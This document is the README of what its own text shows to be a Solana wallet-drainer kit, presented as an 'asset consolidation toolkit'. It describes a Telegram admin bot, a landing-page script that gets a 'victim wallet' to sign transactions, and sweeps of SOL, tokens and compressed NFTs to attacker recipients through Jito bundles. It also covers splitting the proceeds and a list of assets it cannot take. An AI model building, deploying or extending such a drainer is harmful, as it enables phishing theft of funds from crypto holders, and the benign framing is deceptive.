# sol-asset-manager

Solana asset consolidation toolkit.

## Architecture

    Telegram bot  ──▶  campaigns.json  ──▶  Server  ──▶  RPC / Jito / DAS
                            │
                            ▼
                       HTML bundle  ──▶  victim wallet  ──▶  /plan  ──▶  /submit

Modules:

| file           | role                                                              |
|----------------|-------------------------------------------------------------------|
| `core.js`      | Plan builder + submitter. SPL, Token-2022, SOL, closes, Jito.     |
| `cnft.js`      | Compressed NFT sweep via Bubblegum + umi.                         |
| `das.js`       | DAS RPC helpers (getAssetsByOwner, getAssetProof).                |
| `alt.js`       | Per-campaign Address Lookup Table management.                     |
| `recipients.js`| Multi-recipient parsing + entry/lamport distribution.             |
| `store.js`     | JSON persistence for campaigns.                                   |
| `ratelimit.js` | Per-IP token bucket.                                              |
| `server.js`    | HTTP routes: `/plan`, `/submit`, `/health`.                       |
| `bot.js`       | Telegram admin bot.                                               |
| `generate.js`  | Client-side bundle generator + HTML embed snippet.                |

## Setup

    npm install
    cp .env.example .env
    # fill in RECIPIENT (or RECIPIENTS) and SOLANA_RPC_URL
    npm start               # terminal 1
    npm run bot             # terminal 2

On first server boot, an ALT authority keypair is generated in `DATA_DIR/alt-authority.json`.
**Fund it once with ~0.05 SOL** so it can pay ALT creation rent.

## Campaign flow

1. `/newfile name|recipient|mode|liquidMints` in Telegram.
2. `/getfile id` to download the bundle. Serve it from `APP_URL/bundle.js`.
3. Embed the snippet returned by `/snippet` on the landing page.
4. Victim clicks → wallet connects → `/plan` → signs → `/submit`.

## Feature flags

| flag                | effect                                                      |
|---------------------|-------------------------------------------------------------|
| `ENABLE_ALT`        | Use Address Lookup Tables per campaign.                     |
| `ENABLE_CNFT`       | Sweep compressed NFTs (requires `DAS_RPC_URL`).             |
| `USE_JITO`          | Submit as Jito bundle (atomic landing).                     |
| `SIMULATE_BEFORE_PLAN` | Simulate every tx before returning the plan.             |
| `REQUIRE_AUTH`      | HMAC auth on `/plan` and `/submit`.                         |
| `PRIORITY_FEE_MODE` | `dynamic` (p75) or `fixed`.                                 |
| `MAX_CNFT_SWEEP`    | Upper bound on cNFTs per victim to bound tx count.          |

## Address Lookup Tables

ALT holds the fixed programs (Token, Token-2022, System, Compute Budget, ATA, Bubblegum, Noop, etc.),
the 20 most common SPL mints, and the recipient's account. Extending adds new entries in chunks of 20.

ALT is created per campaign on first plan. The server blocks ~1.5 s waiting for activation on cold
start — subsequent plans reuse the cached table.

## cNFT sweep

Requires a DAS-capable RPC. The server queries `getAssetsByOwner`, filters `compression.compressed`,
then `getAssetProof` per asset. Each cNFT becomes its own tx (~200k CU, proof verification dominates).

The client signs cNFT txs after SPL txs, in the same batch loop.

## Multi-recipient

Set `RECIPIENTS=a,b,c`. SPL entries are round-robin assigned across recipients. SOL is split evenly,
remainder to the first recipient. Fee reserve is divided proportionally.

## Jito bundles

When `USE_JITO=true` and the plan returns a `jitoTip`, the client signs the tip tx and posts it with
the drain txs. Server submits the entire bundle atomically. `getBundleStatuses` confirms.

Bundle cap is 5 txs — if a victim's plan exceeds 4 drain txs, the bundle is split and multiple
submissions happen. Set priority high enough that all bundle pieces land in the same window.

## Limitations (honest list)

- **pNFTs** (programmable NFTs with royalty rules) are not swept. They require `mpl-token-metadata`
  `transferV1` with rule-set PDAs and are frequently non-transferable anyway. Standard NFTs (Metaplex
  core / token-metadata v3) transfer as regular SPL and are handled.
- **cNFTs** cap at `MAX_CNFT_SWEEP` per victim to bound RPC cost.
- **Address Lookup Table** extends happen at plan time and add ~1 s latency on cold plans.
- **Token-2022 transfer fees** are computed with `calculateFee`. Transfer hooks are not executed
  beyond what the mint itself enforces.
- **Frozen token accounts** are skipped. Unfreezing requires the freeze authority's signature.

## Dependencies

Pinned to recent versions. If a dep updates its instruction layout (Bubblegum, umi), re-run
`npm install` and re-verify the transfer path via `SIMULATE_BEFORE_PLAN=true` on a test wallet
before flipping to mainnet recipients.

## Logging

Every plan and submit is logged as one JSON line to stdout. Fields: `event`, `ip`, `source`, counts,
`alt`, `bundleId`, `ok`. Pipe to jq or a log shipper as needed.
